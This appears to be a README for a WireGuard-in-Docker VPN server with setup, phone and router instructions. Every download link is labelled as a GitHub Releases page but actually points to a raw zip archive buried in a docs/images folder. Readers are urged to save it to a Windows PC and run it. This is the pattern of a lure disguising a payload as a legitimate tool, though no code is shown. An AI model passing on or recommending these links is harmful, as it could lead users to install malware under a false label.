# 🛡️ docker-wireguard - Simple VPN Server for Home Use

[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)

## 📥 Download

Visit this page to download: [GitHub Releases](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)

Pick the latest release file for your system, then save it to your Windows PC

## 🧰 What this app does

docker-wireguard runs a WireGuard VPN server in Docker

It creates server and client config files on first start

It also creates a QR code, so you can set up a phone without typing long text

You can manage clients with a helper script

It works on amd64, arm64, and arm/v7 systems

## ✅ What you need

- A Windows PC
- Docker Desktop installed
- A stable internet connection
- Access to your router if you plan to use this from outside your home network
- A client app for your other device, such as the WireGuard app on your phone

## 🚀 Get Docker Desktop on Windows

If Docker Desktop is not on your PC yet, install it first

1. Go to the Docker Desktop site
2. Download the Windows version
3. Run the installer
4. Finish the setup
5. Restart your PC if asked

After that, open Docker Desktop and wait until it is ready

## 🖥️ Download and set up docker-wireguard

1. Visit the [GitHub Releases page](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)
2. Download the latest release files
3. Save them in a folder you can find again
4. Open Docker Desktop
5. Start the app from the release files or follow the included setup steps
6. Let the server create its config files on first start
7. Keep the generated files in a safe place

If the release includes a compose file, use that file to start the container

If it includes a ready-made image file, load it into Docker first, then run it

## 📦 First start

When the server starts for the first time, it creates:

- A server config
- A client config
- A QR code for mobile setup
- Default network settings
- Peer entries for client devices

This first start can take a short time while Docker creates the data files

## 📱 Set up a phone or tablet

To use WireGuard on mobile:

1. Install the WireGuard app on your phone or tablet
2. Open the app
3. Add a new tunnel
4. Scan the QR code created by docker-wireguard
5. Save the tunnel
6. Turn it on

This gives your device access to the VPN server without manual typing

## 💻 Add a computer as a client

To use a laptop or desktop:

1. Install the WireGuard app for your system
2. Import the client config file created by docker-wireguard
3. Save the profile
4. Turn on the tunnel

If you need another client later, use the helper script to create one

## 🌐 Router and network setup

If you want to use the VPN when you are away from home, your router must allow traffic to reach the server

Common steps:

1. Open your router settings
2. Find port forwarding
3. Forward the WireGuard port to the machine running Docker
4. Save the change
5. Test the VPN from outside your home network

Use the same port in your client config and on your router

## 🔐 Client management

docker-wireguard includes a helper script for client tasks

Use it to:

- Add a new client
- Remove a client
- Regenerate a client config
- Create a new QR code
- Keep track of peers

This helps when you need to set up a new phone, tablet, or laptop

## 🧾 Files you will see

After setup, you may see files such as:

- Server config files
- Client config files
- QR code images
- Docker data folders
- Peer list files

Keep these files in one folder so you can find them later

## 🛠️ Common use cases

- Secure remote access to your home network
- Private browsing on public Wi-Fi
- Access to local devices while traveling
- A self-hosted VPN server for personal use
- A clean setup for one or more client devices

## 🔎 Topics covered by this project

- docker
- docker-compose
- encryption
- linux
- network
- peer-to-peer
- qr-code
- raspberry-pi
- security
- self-hosted
- vpn
- vpn-client
- vpn-server
- wireguard

## 🧭 Simple setup path

1. Install Docker Desktop on Windows
2. Visit the [Releases page](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)
3. Download the latest release
4. Start the container
5. Wait for the first config to be created
6. Scan the QR code on your phone or import the client file on your computer
7. Turn on the tunnel and test the connection